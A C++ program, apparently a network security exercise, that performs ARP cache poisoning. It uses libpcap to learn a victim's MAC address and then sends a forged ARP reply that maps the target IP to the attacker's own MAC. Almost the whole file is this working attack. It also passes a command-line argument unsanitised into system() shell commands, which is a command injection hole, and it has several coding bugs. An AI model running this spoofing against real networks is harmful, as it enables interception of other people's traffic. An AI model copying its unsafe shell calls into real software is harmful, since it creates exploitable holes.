#include <iostream>
#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include "ethhdr.h"
#include "arphdr.h"


struct ethernet_header {
	u_int8_t dst_mac[6];
	u_int8_t src_mac[6];
	u_int16_t type;
};

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0\n");
}



char * get_mac_addr(const u_char * packet,char src_or_dst){
	ethernet_header * ethernet = (ethernet_header*)packet;
    char * mac_addr = (char *)malloc(sizeof(char)*20);
    if(src_or_dst == 's'){
        sprintf(mac_addr,"%02x:%02x:%02x:%02x:%02x:%02x\n",ethernet->src_mac[0],ethernet->src_mac[1],
                              ethernet->src_mac[2],ethernet->src_mac[3],
                              ethernet->src_mac[4],ethernet->src_mac[5]);
    }else{
        sprintf(mac_addr,"%02x:%02x:%02x:%02x:%02x:%02x\n",ethernet->dst_mac[0],ethernet->dst_mac[1],
                              ethernet->dst_mac[2],ethernet->dst_mac[3],
                              ethernet->dst_mac[4],ethernet->dst_mac[5]);
    }
    return mac_addr;
}

int check_packet(const u_char * packet,char * my_mac){
    ethernet_header* ethernet = (ethernet_header*)packet;
    char * packet_mac_addr_src = get_mac_addr(packet,'s');
    char * packet_mac_addr_dst = get_mac_addr(packet,'d');

    if(ntohs(ethernet->type) == 0x0806){
        if (strncmp(packet_mac_addr_src,my_mac,strlen(my_mac)) == 0
                || strncmp(packet_mac_addr_dst,my_mac,strlen(my_mac)) == 0){
            free(packet_mac_addr_src);
            free(packet_mac_addr_dst);
            return 1;
        }else{
            free(packet_mac_addr_src);
            free(packet_mac_addr_dst);
            return 0;
        }
    }else{
            free(packet_mac_addr_src);
            free(packet_mac_addr_dst);
            return 0;
    }

}

char * get_my_mac_address(char * interface){
	int sock;
	struct ifreq ifr;
	char * mac = NULL; 
	int fd;
    static char mac_addr[20];
	memset(mac_addr,0,sizeof(mac_addr));

	memset(&ifr,0x00,sizeof(ifr));
	strcpy(ifr.ifr_name,interface);

	fd = socket(AF_INET,SOCK_STREAM,0);

	if(sock = socket(AF_INET,SOCK_STREAM,0) < 0){
		printf("socket error");
		exit(1);
	}

	if(ioctl(fd,SIOCGIFHWADDR,&ifr) < 0){
		printf("ioctl");
		exit(1);
	}

	mac = ifr.ifr_hwaddr.sa_data;
    sprintf(mac_addr,"%02x:%02x:%02x:%02x:%02x:%02x\n",mac[0],mac[1],mac[2],mac[3]&0x000000ff,mac[4],mac[5]);

	//close(sock);

	return mac_addr;

}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	char* dev = argv[1];
	pcap_t* pcap = pcap_open_live(dev,BUFSIZ , 1, 1000, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	char arp_command[40] = "arp -d ";
	char ping_command[40] = "ping -c 1  ";

	strncat(arp_command,argv[2], sizeof(argv[2])*2);	
	strncat(ping_command,argv[2], sizeof(argv[2])*2);
	strncat(arp_command," > /dev/null ",12);
	strncat(ping_command," > /dev/null ",12);


	
	system(arp_command);
	system(ping_command);
	int i = 0;
	char * sender_mac;
	char * my_mac = get_my_mac_address(argv[1]);
	while(true){
		struct pcap_pkthdr* header; 
		const u_char* packet; 
		int res = pcap_next_ex(pcap, &header, &packet);
		if(res == 0) continue;
		if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
			continue;
		}	
		if(check_packet(packet,my_mac) == 1){
			if(i == 0){
				++i;
				printf("my : %s\n",my_mac);
				continue;
			}
            sender_mac = get_mac_addr(packet,'s');
			printf("sender : %s\n",sender_mac); 
			break;
		}		

	}



	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
	
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(sender_mac);
	packet.eth_.smac_ = Mac(my_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(my_mac);
	packet.arp_.sip_ = htonl(Ip(argv[3]));
	packet.arp_.tmac_ = Mac(sender_mac);
	packet.arp_.tip_ = htonl(Ip(argv[2]));
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
    free(sender_mac);
}
